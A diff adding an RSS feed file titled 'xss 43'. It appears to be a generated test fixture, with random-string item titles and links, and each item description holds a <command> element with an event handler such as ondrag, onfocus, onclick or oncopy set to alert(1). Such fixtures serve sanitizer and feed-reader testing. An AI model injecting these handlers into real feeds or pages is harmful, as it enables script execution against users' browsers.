@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+  <title>xss 43</title>
+  <link>https://www.GPLAYZVMIGTYMOBMDCCN.com</link>
+  <description>QGTCSFRVVZOMUQLYFMLP</description>
+  <item>
+    <title>OAWHUBCKTULIBKWKCUDK</title>
+    <link>http://wwww.PLYQPMCFJBNLWGFYFZIODROMBPGFOBVDDYDPCFNX.com</link>
+    <description>
+      <command draggable="true" ondrag="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>YCJALZPXQYRRWQZCNKGJ</title>
+    <link>http://wwww.CSVSKGWZCCBRYQMJPTDDOHHGHTDAIFSZFYQMNPEZ.com</link>
+    <description>
+      <command draggable="true" ondragend="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>BNRSDUXXZKGBISOAYOEL</title>
+    <link>http://wwww.UUYRASGQZWQOIXNVKSWXBFSMMHAPXSHEHBRIFNKH.com</link>
+    <description>
+      <command draggable="true" ondragenter="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>PIKROQBCITCBQOWCXYVD</title>
+    <link>http://wwww.TLQAKLKTCQGXWRISORHBWIZHNPVGSDKBXDQWHLHD.com</link>
+    <description>
+      <command draggable="true" ondragleave="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>MBJVVMYLEXFMABCCXVEA</title>
+    <link>http://wwww.UPZSPDWLKYEISVQJUIHOSRPHIQSASDFTWMPVQWNN.com</link>
+    <description>
+      <command draggable="true" ondragstart="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>NGENTGKGKGUZDQMPPSRE</title>
+    <link>http://wwww.OKCFXCRLTCOMNQOGEFWWOTCQXCFNLNXYSTIZWVBB.com</link>
+    <description>
+      <command   onactivate=alert(1)></command>
+    </description>
+  </item>
+  <item>
+    <title>TFWBNSCMWQLWCEMCWGYB</title>
+    <link>http://wwww.DMGDYOCJDCSQNPMXLMMRMIVFZLWNDSEAQFYJZSGV.com</link>
+    <description>
+      <command   onbeforeactivate=alert(1)></command>
+    </description>
+  </item>
+  <item>
+    <title>BSSSKDKRJKIKOISICLYZ</title>
+    <link>http://wwww.BZDAZHWIHJBFVWAYRJUNVVCJCASRZRKKNPOSXMRQ.com</link>
+    <description>
+      <command   onbeforedeactivate=alert(1)></command><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>BXRBUUAEVJJOCHVSXQUR</title>
+    <link>http://wwww.WJRIJKVQZTZUWWBYXTGFCZRACVNRNYCLJWEFODZD.com</link>
+    <description>
+      <command   ondeactivate=alert(1)></command><input id=y autofocus>
+    </description>
+  </item>
+  <item>
+    <title>XNWDTOWYTSNGXWDVFXVZ</title>
+    <link>http://wwww.BEVFYDXNBFNJEYIEUJGQHMFWXOKMTQKTIPHAJXWA.com</link>
+    <description>
+      <command   onfocus=alert(1)></command>
+    </description>
+  </item>
+  <item>
+    <title>RSYOAKHENEHCOTAAPTBU</title>
+    <link>http://wwww.GMPKVVUHLCMTIQFJQSIJWFJDDKNHKVOFYZNGQACH.com</link>
+    <description>
+      <command   onfocusin=alert(1)></command>
+    </description>
+  </item>
+  <item>
+    <title>RKTRUYTSTEFPFOXNBJZV</title>
+    <link>http://wwww.HBRBSPLRUHVZJFXUSXMJUHATCLEBLFOYIIQVCIIG.com</link>
+    <description>
+      <command onbeforecopy="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>MLQEGEDUNZNDLQNGEJCV</title>
+    <link>http://wwww.SBLZDPZSPZJYMYXVQUDEJXKBECWZMCXHCMEENGIM.com</link>
+    <description>
+      <command onbeforecut="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>ALGTLMHNNKZAFIOSVPEB</title>
+    <link>http://wwww.SWEAXJFZNAWTLYJIAHYIKCZMMQCTIHSFCEJXKPPQ.com</link>
+    <description>
+      <command onbeforepaste="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>YKLMGTIEDMTOPNZOPUBD</title>
+    <link>http://wwww.DXHTAYMCNXDLWZPJZXYWWAFJVOVNXODKNOHHAODX.com</link>
+    <description>
+      <command onblur=alert(1)  ></command><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>HYNJUAAPXOJFWKSJYDXT</title>
+    <link>http://wwww.EUVRLIKOGLAOVVMNUTXWSPDBIXPJWZQLIYLEQEYK.com</link>
+    <description>
+      <command onclick="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>PWZXECMYPWGSZZQDXTFI</title>
+    <link>http://wwww.VRWZTJJYNGFBITGHGTCAUPLBJUWNZNYUIBYJLSWK.com</link>
+    <description>
+      <command oncontextmenu="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>WSIUPZHFMSRDBJCZYEYK</title>
+    <link>http://wwww.FEDBYBXHXPCFHAXVHTIQKEWNKCUGXRGRJXJSQKFU.com</link>
+    <description>
+      <command oncopy="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>FFYKTUMIOZUSZHFBJZFW</title>
+    <link>http://wwww.KQLVFZGMKJETRDQWUKFOZRMSBFTAFXRGCNPTUCNM.com</link>
+    <description>
+      <command oncut="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>PKPQLDVTZYOODCKBEKYD</title>
+    <link>http://wwww.QHAZITHXQXEXUONYWYVXITSHRTOXOACZSSPFBFBL.com</link>
+    <description>
+      <command ondblclick="alert(1)">test</command>
+    </description>
+  </item>
+  <item>
+    <title>ZYIWWWEJYXOOAMDDVNKW</title>
+    <link>http://wwww.BZLJQOAISERAKVGRODGUCPDKFUKYNVUWTKZCAGZP.com</link>
+    <description>
+      <command onfocusout=alert(1)  ></command><input autofocus>
+    </description>
+  </item>
+  <item>
+    <title>IUQBOPXHIYJJBKEHBSPI</title>
+    <link>http://wwww.ZPJBYUOKDPGSJHQPIAHJJUJOIPNQSHVJQKQCGXSI.com</link>
+    <description>
+      <command onkeydown="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>JHYZFHDLOSNWPHOVWKTT</title>
+    <link>http://wwww.MCNCOMPUXZYBBCPWPUXCFREDWGWLKLRYQOBWFQDI.com</link>
+    <description>
+      <command onkeypress="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>WDTIVUUOTMXFSMECGMHR</title>
+    <link>http://wwww.WWBYCRFJGXWOSKGXDBBBYNWFORBIVRYDCZLFVDWK.com</link>
+    <description>
+      <command onkeyup="alert(1)" contenteditable>test</command>
+    </description>
+  </item>
+  <item>
+    <title>RZOPZTGAWHHHILZPOGNZ</title>
+    <link>http://wwww.MLZXSVZAOHGOUJKLMCMTYKDSSVGRFEFHAYAUJMQD.com</link>
+    <description>
+      <command onmousedown="alert(1)">test</command>
+    </description>
+  </item>
+</channel>
+</rss>
